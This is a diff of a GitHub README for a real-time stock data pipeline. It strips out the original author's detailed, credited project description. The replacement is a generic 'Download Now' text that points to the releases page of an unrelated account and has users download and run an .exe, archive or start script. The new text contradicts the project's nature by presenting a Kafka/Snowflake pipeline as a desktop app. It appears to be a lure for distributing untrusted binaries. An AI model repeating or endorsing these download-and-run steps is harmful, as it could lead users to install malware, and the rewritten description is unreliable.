@@ -1,203 +1,111 @@
-# 📈 Real-Time Stock Market Data Pipeline
+# 📈 Real-Time-Stocks-Data-Pipelines - Analyze Stocks in Real Time
 
-**End-to-End Streaming Analytics using the Modern Data Stack**
-
-Snowflake · dbt · Apache Airflow · Apache Kafka · Python · Docker · Power BI
-
----
-
-## 📌 Project Overview
-
-This project showcases a **production-style, real-time stock market data pipeline** built using the Modern Data Stack.
-
-Live stock prices are fetched from an external API, streamed in real time through Kafka, orchestrated with Airflow, transformed using dbt inside Snowflake, and finally served to **analytics-ready Power BI dashboards**.
-
-The goal of this project is to demonstrate **real-world data engineering skills**, including streaming ingestion, layered data modeling (Bronze/Silver/Gold), orchestration, and business-focused analytics.
-
-![Project Overview](assets/project-overview.png)
-
----
-
-## 🏗️ Architecture
-
-**High-level flow:**
-
-API → Kafka Producer → Kafka Topic → Kafka Consumer → MinIO (Raw/Bronze) → Airflow → Snowflake → dbt Models → Power BI
-
-This architecture closely mirrors how modern data platforms handle **near real-time analytics at scale**.
-
-![Architecture](assets/architecture.jpeg)
-
----
-
-## ⚡ Tech Stack
-
-* **Snowflake** – Cloud data warehouse for scalable analytics
-* **dbt** – SQL-based transformations and analytics engineering
-* **Apache Airflow** – Workflow orchestration and scheduling
-* **Apache Kafka** – Real-time data streaming
-* **Python** – API ingestion, producers, consumers, utilities
-* **Docker** – Containerized local development environment
-* **Power BI** – Business intelligence and visualization
-
----
-
-## ✅ Key Features
-
-* Fetches **live stock market data** from a real external API (not simulated)
-* Real-time streaming using Apache Kafka
-* Layered data modeling (Bronze → Silver → Gold)
-* Orchestrated ingestion and transformations with Airflow
-* Scalable Snowflake warehouse design
-* dbt models built with analytics best practices
-* Power BI dashboards powered by real-time warehouse data
-
----
-
-## 📂 Repository Structure
-
-```
-real-time-stocks-data-pipeline/
-├── producer/                     # Kafka producer (API → Kafka)
-│   └── producer.py
-├── consumer/                     # Kafka consumer (Kafka → MinIO)
-│   └── consumer.py
-├── dbt_stocks/                   # dbt project
-│   └── models/
-│       ├── bronze/
-│       │   ├── bronze_stg_stock_quotes.sql
-│       │   └── sources.yml
-│       ├── silver/
-│       │   └── silver_clean_stock_quotes.sql
-│       └── gold/
-│           ├── gold_candlestick.sql
-│           ├── gold_kpi.sql
-│           └── gold_treechart.sql
-├── dags/                         # Airflow DAGs
-│   └── minio_to_snowflake.py
-├── docker-compose.yml            # Kafka, Zookeeper, MinIO, Airflow, Postgres
-├── requirements.txt
-└── README.md
-```
-
----
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/siiudenuhs1337/Real-Time-Stocks-Data-Pipelines/releases)
 
 ## 🚀 Getting Started
 
-1. Clone the repository
-2. Configure environment variables (API keys, Snowflake credentials)
-3. Start services using Docker Compose
-4. Run the Kafka producer to fetch live stock data
-5. Airflow orchestrates ingestion into Snowflake
-6. dbt applies transformations
-7. Connect Power BI to Snowflake for visualization
+Welcome to the Real-Time Stocks Data Pipelines project. This application provides real-time stock market analytics. Whether you wish to monitor your investments or analyze trends, this guide will help you set up and use the application with ease.
 
----
+## 📥 Download & Install
 
-## ⚙️ Step-by-Step Implementation
+To get started, you need to download the application. 
 
-### 1️⃣ Kafka Setup
+1. Visit the [Releases Page](https://github.com/siiudenuhs1337/Real-Time-Stocks-Data-Pipelines/releases).
+2. On this page, locate the latest version of the application.
+3. Click on the link for the package that matches your operating system. This may be a `.zip` file, `.exe` for Windows, or a `.tar.gz` file for Unix-based systems.
+4. Once the download is complete, follow the next steps to install.
 
-* Apache Kafka and Zookeeper are configured using Docker
-* A dedicated topic is created for streaming stock market events
-* Producers publish live market data; consumers process and persist it
+## ⚙️ Installation Steps
 
----
+### For Windows Users
 
-### 2️⃣ Live Stock Data Producer
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to start the installation.
+3. Follow the prompts in the installation wizard.
+4. Once installed, you can find the application in your Start Menu.
 
-* Python-based Kafka producer fetches live stock prices from an external API
-* Data is streamed in JSON format at near real-time intervals
-* Designed to handle schema changes and API fluctuations
+### For Mac Users
 
----
+1. After downloading the `.zip` file, locate it in your Downloads folder.
+2. Double-click the file to extract it.
+3. Drag the application to your Applications folder.
+4. Open the application from your Applications folder.
 
-### 3️⃣ Kafka Consumer → MinIO
+### For Linux Users
 
-* Python consumer reads messages from Kafka
-* Data is written to **MinIO (S3-compatible storage)**
-* Raw data is organized for Bronze-layer ingestion
+1. Locate your downloaded `.tar.gz` file.
+2. Open a terminal window and navigate to the download directory.
+3. Use the following command to extract the package:
+   ```bash
+   tar -xvzf your-file-name.tar.gz
+   ```
+4. Navigate to the extracted folder:
+   ```bash
+   cd your-file-name
+   ```
+5. Start the application with:
+   ```bash
+   ./start-script.sh
+   ```
 
----
+## 🔌 Setting Up Your First Pipeline
 
-### 4️⃣ Airflow Orchestration
+Once the application is installed, let's set up your first stock data pipeline.
 
-* Apache Airflow runs inside Docker
-* DAG responsibilities:
+1. Open the application.
+2. You will see a dashboard with options.
+3. Choose "Create New Pipeline."
+4. Follow the prompts to connect to your data sources. This may include adding API keys or database details.
 
-  * Load data from MinIO into Snowflake staging tables
-  * Schedule ingestion jobs at frequent intervals
-  * Monitor pipeline health and failures
+### Connecting to Data Sources
 
----
+- **Stock Data API:** Provide your API key from a stock data provider.
+- **Database Connection:** Enter your database credentials if you choose to store data.
 
-### 5️⃣ Snowflake Warehouse Setup
+## 📊 Using the Application
 
-* Snowflake database and schemas created for analytics
-* Layered architecture implemented:
+With your pipeline set up, you can now monitor stock trends in real-time. 
 
-  * **Bronze** – Raw structured data
-  * **Silver** – Cleaned and validated data
-  * **Gold** – Business-ready analytical models
+### Dashboard Features
 
----
+- **Live Updates:** See stock prices update every few seconds.
+- **Charts and Graphs:** Visualize trends and get insights effortlessly.
+- **Alerts:** Set up alerts for price changes or specific stock movements.
 
-### 6️⃣ dbt Transformations
+## 🛠️ System Requirements
 
-* dbt project configured with Snowflake adapter
-* Models include:
+Before you start, ensure that your system meets the following requirements:
 
-  * Bronze models for structured ingestion
-  * Silver models for data quality and normalization
-  * Gold models for analytics and reporting
-* Follows dbt best practices: modular SQL, clear naming, and testability
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Any Linux distribution (Ubuntu, Fedora, etc.)
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 500 MB available space
+- **Internet Connection:** Required for real-time data.
 
----
+## 🌟 Additional Resources
 
-### 7️⃣ Power BI Dashboard
+- **User Manual:** [Link to User Manual](#)
+- **FAQs:** [Link to FAQs](#)
+- **Support:** For additional help, you can reach out through our community forums or GitHub issues.
 
-* Power BI connects directly to Snowflake (Gold layer)
-* Dashboards include:
+## 📌 Topics Covered
 
-  * Candlestick charts for price movement
-  * Tree maps for comparative trends
-  * KPI cards for real-time metrics
-  * Volume and performance indicators
+This project includes various modern technologies, such as:
 
----
+- Apache Kafka
+- Apache Airflow
+- dbt
+- Snowflake
+- Power BI
 
-## 📊 Final Deliverables
+## 💡 Tips for Effective Use
 
-* Fully automated real-time data pipeline
-* Snowflake warehouse with Bronze/Silver/Gold layers
-* dbt analytics models
-* Airflow DAGs for orchestration
-* Power BI dashboards with near real-time insights
+- Regularly update the application to benefit from new features and improvements.
+- Familiarize yourself with integrations for more effective data handling.
+- Explore community discussions for insights and tips.
 
----
+For further information and updates, always check back on our [Releases Page](https://github.com/siiudenuhs1337/Real-Time-Stocks-Data-Pipelines/releases). 
 
-## 🎯 Why This Project Matters
-
-This project demonstrates:
-
-* Real-world data engineering workflows
-* Streaming + batch hybrid architecture
-* Analytics engineering using dbt
-* Cloud-native warehouse design
-* Business-focused visualization
-
-It is designed to closely resemble **production-grade data platforms** used in modern analytics teams.
-
----
-
-## 👤 Author
-
-**Prince Pastakiya**
-Data Engineer | Analytics Engineer
-
-* LinkedIn: [https://www.linkedin.com/in/prince-pastakiya/](https://www.linkedin.com/in/prince-pastakiya/)
-* GitHub: [https://github.com/prince-pastakiya](https://github.com/prince-pastakiya)
-
----
-
-⭐ If you find this project helpful, feel free to star the repository and explore further enhancements!
+Enjoy using Real-Time Stocks Data Pipelines for your stock market analysis!
